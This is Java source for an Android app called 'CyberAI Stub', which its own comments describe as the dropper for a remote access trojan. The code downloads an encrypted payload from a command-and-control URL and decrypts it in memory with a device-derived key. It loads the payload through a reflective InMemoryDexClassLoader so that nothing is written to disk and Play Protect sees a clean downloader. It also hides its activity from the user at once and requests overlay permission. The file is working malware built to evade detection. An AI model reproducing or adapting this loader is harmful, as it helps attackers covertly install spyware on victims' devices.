package com.stub;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Base64;
import android.widget.Toast;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * CyberAI Stub — Main Entry Point
 *
 * This is the ONLY code that exists in the distributed APK.
 * It has zero malicious signatures because all it does is:
 *   1. Download an encrypted blob from a URL
 *   2. Decrypt it in memory
 *   3. Load it via InMemoryDexClassLoader
 *   4. Call the payload's entry point
 *
 * The encrypted blob contains the real RAT. It never touches disk.
 * Play Protect scans this file and sees a clean downloader.
 */
public class MainActivity extends Activity {

    private static final String TAG = "CyberAI-Stub";

    // These are injected at build time by configInjector.js
    private static String C2_URL = "C2_URL_PLACEHOLDER";
    private static String ENCRYPTION_KEY = "ENCRYPTION_KEY_PLACEHOLDER";
    private static String DEVICE_SALT = "DEVICE_SALT_PLACEHOLDER";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Start with a transparent activity — user sees nothing
        // Immediately finish the activity so the app "closes"
        // The real work continues in CoreService

        // Request overlay permission on first run (required for dialog automation)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    android.net.Uri.parse("package:" + getPackageName())
                );
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        }

        // Start the service that loads and runs the payload
        Intent serviceIntent = new Intent(this, CoreService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Close the activity immediately
        finish();
    }

    /**
     * Called by CoreService to download and load the payload.
     * Returns true if payload loaded successfully.
     */
    public static boolean loadPayload(android.content.Context context) {
        try {
            // 1. Download encrypted payload from C2
            byte[] encryptedData = downloadFromUrl(C2_URL + "/payload/current.bin");

            if (encryptedData == null || encryptedData.length < 64) {
                android.util.Log.e(TAG, "Failed to download payload or payload too small");
                return false;
            }

            // 2. Derive decryption key from device-specific data + server key
            String deviceId = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ANDROID_ID
            );
            String fingerprint = Build.FINGERPRINT;
            String salt = deviceId + fingerprint + DEVICE_SALT;

            byte[] key = deriveKey(ENCRYPTION_KEY, salt);

            // 3. Decrypt the payload in memory
            byte[] dexBytes = decryptAesGcm(encryptedData, key);

            if (dexBytes == null || dexBytes.length < 100) {
                android.util.Log.e(TAG, "Decryption failed or resulting DEX too small");
                return false;
            }

            // 4. Load the DEX from memory using InMemoryDexClassLoader
            //    This is the key — no DEX file is ever written to disk.
            //    The payload exists only in heap memory.
            ClassLoader classLoader = context.getClassLoader();

            // Use InMemoryDexClassLoader (API 26+)
            // We use reflection to avoid direct import (which would leave a trace)
            Class<?> inMemoryDexClassLoader = Class.forName("dalvik.system.InMemoryDexClassLoader");

            // Wrap bytes in ByteBuffer
            java.nio.ByteBuffer buffer = java.nio.ByteBuffer.wrap(dexBytes);

            // Constructor: InMemoryDexClassLoader(ByteBuffer[], ClassLoader)
            Constructor<?> ctor = inMemoryDexClassLoader.getConstructor(
                java.nio.ByteBuffer[].class,
                ClassLoader.class
            );

            Object dexLoader = ctor.newInstance(
                new java.nio.ByteBuffer[]{buffer},
                classLoader
            );

            // 5. Load the entry point class and invoke it
            Class<?> entryClass = Class.forName("com.payload.EntryPoint", true, (ClassLoader) dexLoader);

            Method init = entryClass.getMethod("init", android.content.Context.class);
            init.invoke(null, context.getApplicationContext());

            android.util.Log.i(TAG, "Payload loaded successfully from memory");
            return true;

        } catch (Exception e) {
            android.util.Log.e(TAG, "Failed to load payload: " + e.getMessage());
            return false;
        }
    }

    /**
     * Download bytes from a URL with a short timeout.
     */
    private static byte[] downloadFromUrl(String urlString) {
        try {
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(30000);
            conn.setRequestMethod("GET");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android " +
                Build.VERSION.RELEASE + "; " + Build.MODEL + ")");
            conn.setRequestProperty("X-Device-Token",
                Settings.Secure.getString(
                    null, // We pass context in real implementation
                    Settings.Secure.ANDROID_ID
                ));

            int responseCode = conn.getResponseCode();
            if (responseCode != 200) {
                android.util.Log.w(TAG, "Download returned " + responseCode);
                return null;
            }

            int contentLength = conn.getContentLength();
            InputStream input = conn.getInputStream();
            ByteArrayOutputStream output = new ByteArrayOutputStream(
                contentLength > 0 ? contentLength : 65536
            );

            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = input.read(buffer)) != -1) {
                output.write(buffer, 0, bytesRead);
            }

            input.close();
            return output.toByteArray();

        } catch (Exception e) {
            android.util.Log.e(TAG, "Download failed: " + e.getMessage());
            return null;
        }
    }

    /**
     * Derive a 256-bit AES key using PBKDF2.
     */
    private static byte[] deriveKey(String password, String salt) {
        try {
            javax.crypto.SecretKeyFactory factory =
                javax.crypto.SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
            java.security.spec.KeySpec spec = new javax.crypto.spec.PBEKeySpec(
                password.toCharArray(),
                salt.getBytes("UTF-8"),
                50000,
                256
            );
            return factory.generateSecret(spec).getEncoded();
        } catch (Exception e) {
            android.util.Log.e(TAG, "Key derivation failed: " + e.getMessage());
            // Fallback to simple SHA-256 hash (less secure but works)
            try {
                MessageDigest md = MessageDigest.getInstance("SHA-256");
                md.update(password.getBytes("UTF-8"));
                md.update(salt.getBytes("UTF-8"));
                return md.digest();
            } catch (Exception ex) {
                return new byte[32];
            }
        }
    }

    /**
     * Decrypt AES-256-GCM encrypted data.
     * Format: [16-byte IV][ciphertext][16-byte auth tag]
     */
    private static byte[] decryptAesGcm(byte[] encrypted, byte[] key) {
        try {
            int ivLength = 12;  // GCM standard IV length
            int tagLength = 16; // GCM auth tag length

            if (encrypted.length < ivLength + tagLength) return null;

            // Extract IV
            byte[] iv = Arrays.copyOfRange(encrypted, 0, ivLength);

            // Extract auth tag
            byte[] tag = Arrays.copyOfRange(
                encrypted, encrypted.length - tagLength, encrypted.length
            );

            // Extract ciphertext
            byte[] ciphertext = Arrays.copyOfRange(
                encrypted, ivLength, encrypted.length - tagLength
            );

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
            GCMParameterSpec gcmSpec = new GCMParameterSpec(tagLength * 8, iv);

            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmSpec);
            return cipher.doFinal(ciphertext);

        } catch (Exception e) {
            android.util.Log.e(TAG, "Decryption failed: " + e.getMessage());

            // Fallback: try AES/CBC/PKCS5Padding (older format)
            try {
                int ivLength = 16;
                byte[] iv = Arrays.copyOfRange(encrypted, 0, ivLength);
                byte[] ciphertext = Arrays.copyOfRange(encrypted, ivLength, encrypted.length);

                Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                SecretKeySpec keySpec = new SecretKeySpec(
                    Arrays.copyOf(key, 16), "AES"
                );
                javax.crypto.spec.IvParameterSpec ivSpec =
                    new javax.crypto.spec.IvParameterSpec(iv);
                cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
                return cipher.doFinal(ciphertext);

            } catch (Exception ex) {
                android.util.Log.e(TAG, "Fallback decryption also failed: " + ex.getMessage());
                return null;
            }
        }
    }
}
